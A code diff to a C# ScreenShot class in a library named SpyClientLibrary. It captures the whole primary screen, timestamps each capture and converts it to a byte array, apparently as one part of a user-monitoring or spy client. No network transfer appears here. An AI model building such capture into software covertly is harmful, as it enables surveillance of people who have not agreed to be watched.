@@ -5,15 +5,17 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Drawing;
 using System.Windows.Forms;
+using System.IO;
 
 namespace SpyClientLibrary
 {
     public class ScreenShot
     {
         public Bitmap _currentScreen { get; set; }
-        public DateTime _scrrenData { get; set; }
+        public DateTime _scrrenDate { get; set; }
         public User _user { get; set; }
-        public string _screenName { get; set; }
+        public string _screenName { get; set; }        
+        public byte[] _data { get; set; }
 
         public ScreenShot(User user)
         {
@@ -22,7 +24,7 @@ namespace SpyClientLibrary
 
         public ScreenShot GenerateCurrentScreen()
         {
-            _scrrenData = DateTime.Now;
+            _scrrenDate = DateTime.Now;
 
             using (Bitmap bmpScreenCapture = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                             Screen.PrimaryScreen.Bounds.Height))
@@ -35,7 +37,8 @@ namespace SpyClientLibrary
                                      bmpScreenCapture.Size,
                                      CopyPixelOperation.SourceCopy);
                 }
-                _currentScreen = bmpScreenCapture;    
+                _currentScreen = bmpScreenCapture;
+                _data = ImageToByteArray(_currentScreen);
             }            
             CreateScreenName();
             return this;
@@ -44,14 +47,27 @@ namespace SpyClientLibrary
         private string CreateScreenName()
         {
             //FORMAT : username_YYYY_M_D_h_m.bmp
-            _screenName = _user._userName + "_" + 
-                          _scrrenData.Year.ToString() + "_" +
-                          _scrrenData.Month.ToString() +"_" +
-                          _scrrenData.Day.ToString() + "_" +
-                          _scrrenData.Hour.ToString() + "_" +
-                          _scrrenData.Minute.ToString() + ".bmp";
+            _screenName = /*_user._userName + "_" +*/ 
+                          _scrrenDate.Year.ToString() + "_" +
+                          _scrrenDate.Month.ToString() +"_" +
+                          _scrrenDate.Day.ToString() + "_" +
+                          _scrrenDate.Hour.ToString() + "_" +
+                          _scrrenDate.Minute.ToString() + ".bmp";
             return _screenName;
         }
-        
+        private byte[] ImageToByteArray(Image imageIn)
+        {
+            using (var ms = new MemoryStream())
+            {
+                imageIn.Save(ms, System.Drawing.Imaging.ImageFormat.Gif);
+                return ms.ToArray();
+            }
+        }
+        public static Image byteArrayToImage(byte[] byteArrayIn)
+        {
+            MemoryStream ms = new MemoryStream(byteArrayIn);
+            Image returnImage = Image.FromStream(ms);
+            return returnImage;
+        }
     }
 }
